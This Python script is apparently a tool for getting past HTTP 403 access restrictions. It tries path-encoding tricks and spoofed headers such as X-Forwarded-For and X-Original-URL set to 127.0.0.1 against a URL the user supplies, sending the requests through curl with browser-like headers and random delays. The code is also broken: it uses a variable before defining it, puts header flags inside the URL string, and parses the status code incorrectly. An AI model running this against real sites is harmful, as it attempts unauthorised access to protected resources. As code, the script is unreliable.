import os
import time
import subprocess
import re  
import random

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')


fullUrl = str(input("Please enter an url leading to a 403 error : "))
matchHostname = re.match(r"https?://([^/]+)", fullUrl)
matchPath = re.match(r"https?://[^/]+/(.*)", fullUrl)
matchMethod = re.match(r"([^:]+)", fullUrl)

if matchHostname and matchPath and matchMethod:
    HOSTNAME = matchHostname.group(1)
    PATH = matchPath.group(1)
    METHOD = matchMethod.group(1)
    print(METHOD)
else:
    print("Invalid url")
    exit()
        
headers = [
        ("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"),
        ("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"),
        ("Accept-Language", "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7"),
        ("Accept-Encoding", "gzip, deflate, br"),
        ("DNT", "1"),
        ("Connection", "keep-alive"),
        ("Upgrade-Insecure-Requests", "1"),
        ("Sec-Fetch-Dest", "document"),
        ("Sec-Fetch-Mode", "navigate"),
        ("Sec-Fetch-User", "?1"),
        ("Cache-Control", "max-age=0"),
        ("sec-ch-ua", '"Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"'),
        ("sec-ch-ua-mobile", "?0"),
        ("sec-ch-ua-platform", '"Windows"'),
    ]

urlListBuilder = [
    f"{HOSTNAME}/{PATH}",
    f"{HOSTNAME}/%2e/{PATH}",
    f"{HOSTNAME}/{PATH}/.",
    f"{HOSTNAME}//{PATH}//",
    f"{HOSTNAME}/./{PATH}/./",
    f"{HOSTNAME}/{PATH}anything -H 'X-Original-URL: /{PATH}'",
    f"{HOSTNAME}/{PATH} -H 'X-Custom-IP-Authorization: 127.0.0.1' ",
    f"{HOSTNAME} -H 'X-Rewrite-URL: /{PATH}'",
    f"{HOSTNAME}/{PATH} -H 'Referer: /{PATH}'",
    f"{HOSTNAME}/{PATH} -H 'X-Originating-IP: 127.0.0.1'",
    f"{HOSTNAME}/{PATH} -H 'X-Forwarded-For: 127.0.0.1'",
    f"{HOSTNAME}/{PATH} -H 'X-Remote-IP: 127.0.0.1'",
    f"{HOSTNAME}/{PATH} -H 'X-Client-IP: 127.0.0.1'",
    f"{HOSTNAME}/{PATH} -H 'X-Host: 127.0.0.1'",
    f"{HOSTNAME}/{PATH} -H 'X-Forwarded-Host: 127.0.0.1'",
    f"{HOSTNAME}/{PATH}%20/",
    f"{HOSTNAME}/%20{PATH}%20/",
    f"{HOSTNAME}/{PATH}?",
    f"{HOSTNAME}/{PATH}???",
    f"{HOSTNAME}/{PATH}//",
    f"{HOSTNAME}/{PATH}/",
    f"{HOSTNAME}/{PATH}/.randomstring",
    f"{HOSTNAME}/{PATH}..;/"]
    
for elt in urlListBuilder:
    cmd = ["curl", "-X", "GET", elt]
        
    for key, value in headers:
        cmd.extend(["-H", f"{key}: {value}"])
        
    cmd.extend([
        "--compressed",
        "-L",
        "-s",
        "-i",
        "-w", f"\nHTTP_CODE: {http_code}\n"
    ])

    result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
    http_code_match = re.match(r"HTTP_CODE:(\d+)", result.stdout)
    if http_code_match:
        http_code = http_code_match.group(1)

        if http_code == "200":
            print(f"\033[92m✓ SUCCESS [200]\033[0m : {METHOD}://{elt}")
            print(f"Response length: {len(result.stdout)} bytes\n")
        elif http_code.startswith("3"):
            print(f"\033[93m→ REDIRECT [{http_code}]\033[0m : {METHOD}://{elt}")
        else:
            print(f"\033[91m✗ FAILED [{http_code}]\033[0m : {METHOD}://{elt}")

    time.sleep(random.uniform(0.5, 2.0))